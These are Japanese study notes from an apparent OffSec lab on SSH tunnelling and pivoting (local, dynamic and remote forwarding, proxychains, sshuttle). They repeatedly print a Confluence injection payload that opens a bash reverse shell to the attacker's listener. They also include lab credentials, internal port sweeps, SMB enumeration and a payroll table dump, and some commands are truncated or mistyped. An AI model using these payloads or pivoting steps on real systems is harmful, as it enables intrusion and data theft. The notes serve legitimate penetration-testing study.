https://github.com/PowerShell/Win32-OpenSSH/releases
# SSHローカルポート転送
![](Assets/Images/Pasted%20image%2020260429200052.png)
Kali
```bash
#Terminal-1
rlwrap nc -nlvp 4444

#Terminal-2
curl http://192.168.162.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.195/4444%200%3E%261%27%29.start%28%29%22%29%7D/
```

CONFLENCE01
```bash
python3 -c 'import pty; pty.spawn("/bin/sh")'

ssh database_admin@10.4.162.215
sqlpass123
```

PGDATABASE01
```bash
ip addr
4: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    inet 10.4.162.215/24 brd 10.4.162.255 scope global ens192
5: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    inet 172.16.162.254/24 brd 172.16.162.255 scope global ens224

ip route
10.4.162.0/24 dev ens192 proto kernel scope link src 10.4.162.215 
172.16.162.0/24 dev ens224 proto kernel scope link src 172.16.162.254 

for i in $(seq 1 254); do nc -zv -w 1 172.16.162.$i 445; done
```

CONFLENCE01
```bash
ssh -N -L 0.0.0.0:4455:172.16.162.217:445 database_admin@10.4.162.215
sqlpass123

#接続を確認したい場合は別のリバースシェルを確立し以下のコマンドを打ち込む
ss -ntplu
```
![](Assets/Images/Pasted%20image%2020260429200109.png)

Kali
```bash
smbclient -p 4455 -L //192.168.162.63/ -U hr_admin --password=Welcome1234

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Scripts         Disk      
        Users           Disk      

smbclient -p 4455 //192.168.162.63/scripts -U hr_admin --password=Welcome1234
ls

get Provisioning.ps1
```

## Lab
```bash
#Kali
rlwrap -nlvp 4444
curl http://192.168.162.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.195/5555%200%3E%261%27%29.start%28%29%22%29%7D/

#CONFULENCE01
ssh -N -L 0.0.0.0:4242in@10.4.162.215:172.16.162.217:4242 database_admin@10.4.162.215
sqlpass123

#Kali
#OffSecポータルからダウンロードしたファイルを使用してコネクションするとFlagが分かる
chmod 777 1e4c3abaa24721e69c1359811673c91f-ssh_local_client 

./1e4c3abaa24721e69c1359811673c91f-ssh_local_client -i 192.168.162.63 -p 4242 
Connecting to 192.168.162.63:4242
Flag: "OS{3b5ef7f2b1f54f6646b11b39a2aae30e}"
```
---
# SSHダイナミックポートフォワーディング
![](Assets/Images/Pasted%20image%2020260429200121.png)
この柔軟性を活用するには、使用するソフトウェアが正しいSOCKSプロトコル形式でパケットを送信できることを確認する必要があります。
## 初期侵入
Kali
```bash
rlwrap nc -nlvp 4444

curl http://192.168.158.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.236/4444%200%3E%261%27%29.start%28%29%22%29%7D/
```

## SSHトンネリング
Victim
```bash
python3 -c 'import pty; pty.spawn("/bin/sh")'

ssh -N -D 0.0.0.0:9999 database_admin@10.4.158.215
sqlpass123
```

## Proxychainの設定
Kali
```bash
tail /etc/proxychains4.conf

sudo cp /etc/proxychains.conf /etc/proxychains.conf.bak
sudo vi /etc/proxychains.conf
```
![](Assets/Images/Pasted%20image%2020260429200131.png)

## Proxychain
### smb接続
```bash
proxychains smbclient -L //172.16.158.217/ -U hr_admin --password=Welcome1234
```
![](Assets/Images/Pasted%20image%2020260429200139.png)

## nmap
```bash
#Top 20 Ports Scan
sudo proxychains nmap -vvv -sT --top-ports=20 -Pn 172.16.158.217
Discovered open port 445/tcp on 172.16.158.217
Discovered open port 135/tcp on 172.16.158.217
Discovered open port 3389/tcp on 172.16.158.217
Discovered open port 139/tcp on 172.16.158.217

#Port Range Scan
sudo proxychains nmap -vvv -sT -p4870-4900 -Pn 172.16.158.217 | grep open
Discovered open port 4872/tcp on 172.16.158.217
```

## Lab
```bash
chmod 777 218cf66c8276ce6b350b6174e2cf70b1-ssh_dynamic_client

sudo proxychains ./218cf66c8276ce6b350b6174e2cf70b1-ssh_dynamic_client -i 172.16.158.217 -p4872
```
![](Assets/Images/Pasted%20image%2020260429200147.png)

---
#  SSHリモートポート転送
![](Assets/Images/Pasted%20image%2020260429200154.png)

## SSH Server
```bash
sudo systemctl start ssh

sudo ss -ntplu
```
![](Assets/Images/Pasted%20image%2020260429200200.png)

ユーザー名とパスワードを使用して Kali SSH サーバーに接続するには、/etc/ssh/sshd_configで PasswordAuthentication をyesに設定して、パスワードベースの認証を明示的に許可する必要がある場合があります。

Kali
```bash
rlwrap -nlvp 4444

curl http://192.168.158.63:8090/%24%7Bnew%20javax.script.ScriptEngi%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%270%3E%261%27%29.start%28%29%22%29%7D/
```

## SSH Remote Port Forwarding

Victim
```bash
#Victim 
python3 -c 'import pty; pty.spawn("/bin/sh")'

ssh -N -R 127.0.0.1:2345:10.4.158.215:5432 kali@192.168.45.236
```

Kali
```
ss -ntplu
```
![](Assets/Images/Pasted%20image%2020260429200217.png)
## Database Access
kali
```bash
psql -h 127.0.0.1 -p 2345 -U postgres
D@t4basePassw0rd!

\l
```
![](Assets/Images/Pasted%20image%2020260429200224.png)
## Lab1
```bash
\c hr_backup

select * from payroll;
```
![](Assets/Images/Pasted%20image%2020260429200230.png)

## Lab2
```bash
python3 -c 'import pty; pty.spawn("/bin/sh")'

ssh -N -R 127.0.0.1:2345:10.4.158.215:4444 kali@192.168.45.236

chmod 777 2e345e06246bd4465204327a6d6892a5-ssh_remote_client

./2e345e06246bd4465204327a6d6892a5-ssh_remote_client -p 2345
```
![](Assets/Images/Pasted%20image%2020260429200236.png)

---

# SSHリモートダイナミックポートフォワーディング
![](Assets/Images/Pasted%20image%2020260429200244.png)
リモートダイナミックポートフォワーディングは、2017年10月のOpenSSH 7.6以降でのみ利用可能になりました。ただし、この機能を使用するにはOpenSSHクライアントのバージョンが7.6以上である必要があります。サーバーのバージョンは関係ありません。

![](Assets/Images/Pasted%20image%2020260429200250.png)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
ssh -N -R 9998 kali@192.168.45.236

tail /etc/proxychains.conf
```
![](Assets/Images/Pasted%20image%2020260429200256.png)

```bash
proxychains nmap -vvv -sT -p9000-9100 -Pn -n 10.4.158.64

#nmapがダメな時の代替手段
proxychains -q nc -zv 10.4.158.64 9000-9100 -w 3
```
![](Assets/Images/Pasted%20image%2020260429200303.png)
## Lab
```bash
chmod 777 ffeb2f612236b516f854380ff9b73ee2-ssh_remote_dynamic_client

proxychains ./ffeb2f612236b516f854380ff9b73ee2-ssh_remote_dynamic_client -i 10.4.158.64 -p 9062
```
![](Assets/Images/Pasted%20image%2020260429200309.png)

---

# Using sshuttle
Terminal01
```bash
rlwrap nc -nlvp 4444
```

Terminal02
```bash
curl http://192.168.158.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.236/4444%200%3E%261%27%29.start%28%29%22%29%7D/
```

Terminal01
```
socat TCP-LISTEN:2222,fork TCP:10.4.158.215:22
```

Terminal02
```bash
sshuttle -r database_admin@192.168.158.63:2222 10.4.158.0/24 172.16.158.0/24
sqlpass123
```

Terminal03
```bash
smbclient -L //172.16.158.217/ -U hr_admin --password=Welcome1234
```
![](Assets/Images/Pasted%20image%2020260429200318.png)

---
